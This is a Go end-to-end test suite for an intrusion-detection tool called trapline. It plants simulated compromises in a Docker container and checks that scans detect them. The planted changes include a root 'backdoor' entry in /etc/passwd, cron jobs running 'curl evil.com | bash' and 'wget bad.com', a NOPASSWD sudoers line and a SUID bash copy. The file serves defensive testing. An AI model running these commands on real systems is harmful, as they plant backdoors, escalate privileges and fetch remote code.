//go:build e2e

// Package e2e contains end-to-end tests that spin up Docker containers
// and verify trapline behavior against a real Linux environment.
//
// Run with: go test -tags e2e -v ./e2e/ -timeout 5m
//
// Prerequisites:
//   - Docker must be running
//   - The trapline binary must be built for linux/amd64:
//     CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build -o e2e/trapline ./cmd/trapline
package e2e

import (
	"bytes"
	"fmt"
	"os"
	"os/exec"
	"strings"
	"testing"
	"time"
)

const (
	imageName     = "trapline-e2e"
	containerName = "trapline-e2e-test"
)

// TestMain builds the Docker image once, runs all tests, then cleans up.
func TestMain(m *testing.M) {
	// Ensure binary exists
	if _, err := os.Stat("trapline"); err != nil {
		fmt.Println("ERROR: trapline binary not found in e2e/ directory.")
		fmt.Println("Build it first: CGO_ENABLED=0 GOOS=linux go build -o e2e/trapline ./cmd/trapline")
		os.Exit(1)
	}

	// Build Docker image
	fmt.Println("Building e2e Docker image...")
	if err := run("docker", "build", "-t", imageName, "."); err != nil {
		fmt.Printf("Failed to build Docker image: %v\n", err)
		os.Exit(1)
	}

	code := m.Run()

	// Cleanup
	runQuiet("docker", "rm", "-f", containerName)

	os.Exit(code)
}

func startContainer(t *testing.T) {
	t.Helper()
	// Remove any leftover container (ignore errors/output if it doesn't exist)
	runQuiet("docker", "rm", "-f", containerName)

	// Start fresh container
	if err := run("docker", "run", "-d",
		"--name", containerName,
		"-v", absPath("trapline-e2e.yml")+":/etc/trapline/trapline.yml:ro",
		imageName); err != nil {
		t.Fatalf("Failed to start container: %v", err)
	}

	// Wait for container to be ready
	time.Sleep(500 * time.Millisecond)
}

func stopContainer(t *testing.T) {
	t.Helper()
	runQuiet("docker", "rm", "-f", containerName)
}

// dockerExec runs a command in the test container and returns stdout.
func dockerExec(args ...string) (string, error) {
	cmdArgs := append([]string{"exec", containerName}, args...)
	cmd := exec.Command("docker", cmdArgs...)
	var stdout, stderr bytes.Buffer
	cmd.Stdout = &stdout
	cmd.Stderr = &stderr
	err := cmd.Run()
	if err != nil {
		return stdout.String(), fmt.Errorf("%w: stderr=%s", err, stderr.String())
	}
	return stdout.String(), nil
}

// --- Tests ---

func TestVersionCommand(t *testing.T) {
	startContainer(t)
	defer stopContainer(t)

	out, err := dockerExec("trapline", "version")
	if err != nil {
		t.Fatalf("trapline version: %v", err)
	}
	if !strings.Contains(out, "Trapline") {
		t.Errorf("expected 'Trapline' in output: %s", out)
	}
}

func TestVersionJSON(t *testing.T) {
	startContainer(t)
	defer stopContainer(t)

	out, err := dockerExec("trapline", "version", "--json")
	if err != nil {
		t.Fatalf("trapline version --json: %v", err)
	}
	if !strings.Contains(out, `"version"`) {
		t.Errorf("expected JSON version output: %s", out)
	}
}

func TestConfigCheck(t *testing.T) {
	startContainer(t)
	defer stopContainer(t)

	out, err := dockerExec("trapline", "config", "check", "--config", "/etc/trapline/trapline.yml")
	if err != nil {
		t.Fatalf("config check: %v\nOutput: %s", err, out)
	}
	if !strings.Contains(out, "OK") {
		t.Errorf("expected 'OK' in output: %s", out)
	}
}

func TestScanCleanSystem(t *testing.T) {
	startContainer(t)
	defer stopContainer(t)

	// First scan should be learning mode — captures baselines, returns clean
	out, err := dockerExec("trapline", "scan", "--config", "/etc/trapline/trapline.yml")
	if err != nil {
		// Exit code 1 means findings present, which is possible on first run
		// for ssh/permissions modules that check absolute rules
		t.Logf("scan output: %s (err: %v)", out, err)
	}
}

func TestRebaseline(t *testing.T) {
	startContainer(t)
	defer stopContainer(t)

	// Initial scan to create baselines
	dockerExec("trapline", "scan", "--config", "/etc/trapline/trapline.yml")

	// Rebaseline
	out, err := dockerExec("trapline", "rebaseline", "--config", "/etc/trapline/trapline.yml")
	if err != nil {
		t.Fatalf("rebaseline: %v\nOutput: %s", err, out)
	}
	if !strings.Contains(out, "rebaselined") {
		t.Errorf("expected 'rebaselined' in output: %s", out)
	}
}

func TestRebaselineSingleModule(t *testing.T) {
	startContainer(t)
	defer stopContainer(t)

	dockerExec("trapline", "scan", "--config", "/etc/trapline/trapline.yml")

	out, err := dockerExec("trapline", "rebaseline", "--config", "/etc/trapline/trapline.yml", "--module", "file-integrity")
	if err != nil {
		t.Fatalf("rebaseline module: %v\nOutput: %s", err, out)
	}
	if !strings.Contains(out, "file-integrity") {
		t.Errorf("expected 'file-integrity' in output: %s", out)
	}
}

func TestDetectsNewUser(t *testing.T) {
	startContainer(t)
	defer stopContainer(t)

	// Baseline scan
	dockerExec("trapline", "scan", "--config", "/etc/trapline/trapline.yml")

	// Add a suspicious user
	_, err := dockerExec("useradd", "-m", "hacker")
	if err != nil {
		t.Fatalf("useradd: %v", err)
	}

	// Scan again — should detect the new user
	out, _ := dockerExec("trapline", "scan", "--config", "/etc/trapline/trapline.yml")
	if !strings.Contains(out, "user-added") || !strings.Contains(out, "hacker") {
		t.Errorf("expected user-added:hacker finding in:\n%s", out)
	}
}

func TestDetectsModifiedPasswd(t *testing.T) {
	startContainer(t)
	defer stopContainer(t)

	// Baseline
	dockerExec("trapline", "scan", "--config", "/etc/trapline/trapline.yml")

	// Modify /etc/passwd directly (simulate tampering)
	dockerExec("bash", "-c", "echo 'backdoor:x:0:0::/root:/bin/bash' >> /etc/passwd")

	// Scan
	out, _ := dockerExec("trapline", "scan", "--config", "/etc/trapline/trapline.yml")
	if !strings.Contains(out, "file-modified") || !strings.Contains(out, "user-added") {
		t.Errorf("expected findings for passwd modification in:\n%s", out)
	}
}

func TestDetectsNewCronJob(t *testing.T) {
	startContainer(t)
	defer stopContainer(t)

	// Baseline
	dockerExec("trapline", "scan", "--config", "/etc/trapline/trapline.yml")

	// Add malicious cron job
	dockerExec("bash", "-c", "echo '* * * * * root curl evil.com | bash' > /etc/cron.d/backdoor")

	// Scan
	out, _ := dockerExec("trapline", "scan", "--config", "/etc/trapline/trapline.yml")
	if !strings.Contains(out, "cron-added") {
		t.Errorf("expected cron-added finding in:\n%s", out)
	}
}

func TestDetectsSSHConfigChange(t *testing.T) {
	startContainer(t)
	defer stopContainer(t)

	// Baseline
	dockerExec("trapline", "scan", "--config", "/etc/trapline/trapline.yml")

	// Weaken SSH config
	dockerExec("bash", "-c", "echo 'PermitRootLogin yes' >> /etc/ssh/sshd_config")

	// Scan
	out, _ := dockerExec("trapline", "scan", "--config", "/etc/trapline/trapline.yml")
	if !strings.Contains(out, "ssh-config-changed") || !strings.Contains(out, "ssh-insecure-setting") {
		t.Errorf("expected ssh findings in:\n%s", out)
	}
}

func TestDetectsSudoersChange(t *testing.T) {
	startContainer(t)
	defer stopContainer(t)

	// Baseline
	dockerExec("trapline", "scan", "--config", "/etc/trapline/trapline.yml")

	// Modify sudoers
	dockerExec("bash", "-c", "echo 'hacker ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers")

	// Scan
	out, _ := dockerExec("trapline", "scan", "--config", "/etc/trapline/trapline.yml")
	if !strings.Contains(out, "sudoers-modified") {
		t.Errorf("expected sudoers-modified finding in:\n%s", out)
	}
}

func TestDetectsNewSuidBinary(t *testing.T) {
	startContainer(t)
	defer stopContainer(t)

	// Baseline
	dockerExec("trapline", "scan", "--config", "/etc/trapline/trapline.yml")

	// Create a SUID binary
	dockerExec("bash", "-c", "cp /bin/bash /tmp/escalate && chmod 4755 /tmp/escalate")

	// Scan — suid module scans /usr, /bin, /sbin, /opt by default
	// We need to make it scan /tmp too, or put it somewhere scannable
	dockerExec("bash", "-c", "cp /bin/bash /usr/local/bin/escalate && chmod 4755 /usr/local/bin/escalate")

	out, _ := dockerExec("trapline", "scan", "--config", "/etc/trapline/trapline.yml")
	if !strings.Contains(out, "suid-unexpected") {
		t.Errorf("expected suid-unexpected finding in:\n%s", out)
	}
}

func TestDetectsNewListeningPort(t *testing.T) {
	startContainer(t)
	defer stopContainer(t)

	// Baseline
	dockerExec("trapline", "scan", "--config", "/etc/trapline/trapline.yml")

	// Start a listener on a new port
	dockerExec("bash", "-c", "python3 -m http.server 8888 &")
	time.Sleep(1 * time.Second)

	// Scan
	out, _ := dockerExec("trapline", "scan", "--config", "/etc/trapline/trapline.yml")
	if !strings.Contains(out, "port-new") {
		t.Errorf("expected port-new finding in:\n%s", out)
	}
}

func TestDetectsRemovedCronJob(t *testing.T) {
	startContainer(t)
	defer stopContainer(t)

	// Baseline (includes the heartbeat cron)
	dockerExec("trapline", "scan", "--config", "/etc/trapline/trapline.yml")

	// Remove cron
	dockerExec("rm", "/etc/cron.d/heartbeat")

	out, _ := dockerExec("trapline", "scan", "--config", "/etc/trapline/trapline.yml")
	if !strings.Contains(out, "cron-removed") {
		t.Errorf("expected cron-removed finding in:\n%s", out)
	}
}

func TestRebaselineResolvesFindings(t *testing.T) {
	startContainer(t)
	defer stopContainer(t)

	// Baseline
	dockerExec("trapline", "scan", "--config", "/etc/trapline/trapline.yml")

	// Make a change
	dockerExec("useradd", "-m", "newuser")

	// Verify it's detected
	out, _ := dockerExec("trapline", "scan", "--config", "/etc/trapline/trapline.yml")
	if !strings.Contains(out, "user-added") {
		t.Fatal("change wasn't detected")
	}

	// Rebaseline
	dockerExec("trapline", "rebaseline", "--config", "/etc/trapline/trapline.yml")

	// Scan again — should be clean (for users module at least)
	out, _ = dockerExec("trapline", "scan", "--config", "/etc/trapline/trapline.yml")
	if strings.Contains(out, "user-added:newuser") {
		t.Errorf("expected no user-added finding after rebaseline, got:\n%s", out)
	}
}

func TestScanSingleModule(t *testing.T) {
	startContainer(t)
	defer stopContainer(t)

	out, err := dockerExec("trapline", "scan", "--config", "/etc/trapline/trapline.yml", "--module", "ssh")
	if err != nil {
		// SSH module might report insecure settings
		t.Logf("scan output (may have findings): %s", out)
	}
	// Should not crash
}

func TestFindingsCommand(t *testing.T) {
	startContainer(t)
	defer stopContainer(t)

	// Create a finding
	dockerExec("trapline", "scan", "--config", "/etc/trapline/trapline.yml") // baseline
	dockerExec("useradd", "-m", "intruder")

	out, _ := dockerExec("trapline", "findings", "--config", "/etc/trapline/trapline.yml")
	// Output is JSON
	if !strings.Contains(out, "intruder") {
		t.Errorf("expected intruder in findings output:\n%s", out)
	}
}

func TestFindingsTableFormat(t *testing.T) {
	startContainer(t)
	defer stopContainer(t)

	dockerExec("trapline", "scan", "--config", "/etc/trapline/trapline.yml")
	dockerExec("useradd", "-m", "badguy")

	out, _ := dockerExec("trapline", "findings", "--config", "/etc/trapline/trapline.yml", "--format", "table")
	if !strings.Contains(out, "badguy") {
		t.Errorf("expected badguy in table output:\n%s", out)
	}
}

func TestMultipleChangesDetected(t *testing.T) {
	startContainer(t)
	defer stopContainer(t)

	// Baseline
	dockerExec("trapline", "scan", "--config", "/etc/trapline/trapline.yml")

	// Make multiple changes simultaneously
	dockerExec("useradd", "-m", "attacker")
	dockerExec("bash", "-c", "echo '* * * * * root wget bad.com' > /etc/cron.d/evil")
	dockerExec("bash", "-c", "echo 'PasswordAuthentication yes' >> /etc/ssh/sshd_config")

	// Scan
	out, _ := dockerExec("trapline", "scan", "--config", "/etc/trapline/trapline.yml")

	checks := []string{"user-added", "cron-added", "ssh"}
	for _, check := range checks {
		if !strings.Contains(out, check) {
			t.Errorf("expected %q in scan output:\n%s", check, out)
		}
	}
}

// --- Rootkit Module Tests ---

func TestDetectsHiddenFilesInTmp(t *testing.T) {
	startContainer(t)
	defer stopContainer(t)

	// Baseline
	dockerExec("trapline", "scan", "--config", "/etc/trapline/trapline.yml")

	// Drop a hidden file in /tmp (common rootkit behavior)
	dockerExec("bash", "-c", "echo 'payload' > /tmp/.hidden_backdoor")

	out, _ := dockerExec("trapline", "scan", "--config", "/etc/trapline/trapline.yml")
	if !strings.Contains(out, "rootkit-hidden-file") {
		t.Errorf("expected rootkit-hidden-file finding in:\n%s", out)
	}
}

func TestDetectsRegularFileInDev(t *testing.T) {
	startContainer(t)
	defer stopContainer(t)

	dockerExec("trapline", "scan", "--config", "/etc/trapline/trapline.yml")

	// Create a regular file in /dev (rootkits hide data here)
	dockerExec("bash", "-c", "echo 'hidden' > /dev/.secret")

	out, _ := dockerExec("trapline", "scan", "--config", "/etc/trapline/trapline.yml")
	if !strings.Contains(out, "rootkit-dev-file") {
		t.Errorf("expected rootkit-dev-file finding in:\n%s", out)
	}
}

// --- Network Module Tests ---

func TestDetectsNewOutboundConnection(t *testing.T) {
	startContainer(t)
	defer stopContainer(t)

	// Baseline
	dockerExec("trapline", "scan", "--config", "/etc/trapline/trapline.yml")

	// Start an outbound connection to a public IP (this may or may not work in Docker,
	// but the test validates the scan doesn't crash and the module runs)
	dockerExec("bash", "-c", "python3 -c \"import socket; s=socket.socket(); s.settimeout(1); s.connect_ex(('8.8.8.8',53)); s.close()\" 2>/dev/null || true")

	// Just verify the scan completes without error
	out, _ := dockerExec("trapline", "scan", "--config", "/etc/trapline/trapline.yml")
	_ = out // network findings depend on actual connectivity
}

// --- Malware Module Tests ---

func TestMalwareModuleRunsWithoutClamAV(t *testing.T) {
	startContainer(t)
	defer stopContainer(t)

	// ClamAV is not installed in the test container — module should silently skip
	out, _ := dockerExec("trapline", "scan", "--config", "/etc/trapline/trapline.yml")
	// Should not contain any malware errors — the module degrades gracefully
	if strings.Contains(out, "malware") && strings.Contains(out, "error") {
		t.Errorf("malware module should degrade gracefully without ClamAV:\n%s", out)
	}
}

// --- Helpers ---

func run(name string, args ...string) error {
	cmd := exec.Command(name, args...)
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr
	return cmd.Run()
}

// runQuiet runs a command and discards output (used for cleanup where errors are expected).
func runQuiet(name string, args ...string) error {
	return exec.Command(name, args...).Run()
}

func absPath(rel string) string {
	dir, _ := os.Getwd()
	return dir + "/" + rel
}
